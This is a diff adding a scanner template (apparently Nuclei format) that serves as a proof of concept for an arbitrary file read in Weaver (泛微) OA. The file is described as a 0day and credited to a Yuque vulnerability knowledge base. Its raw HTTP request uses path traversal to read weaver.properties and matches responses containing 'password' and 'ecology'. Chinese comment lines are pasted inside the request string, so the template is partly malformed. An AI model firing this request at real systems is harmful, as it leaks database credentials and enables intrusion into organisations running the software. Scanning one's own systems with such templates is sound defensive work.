@@ -1,0 +1,34 @@
+id: poc-yqa0mrs4w8l7iv88
+info:
+  name: 泛微 OA 0day 任意文件读取
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yqa0mrs4w8l7iv88'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yqa0mrs4w8l7iv88
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?ecology)(?=.*?password)(?=.*?charset).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
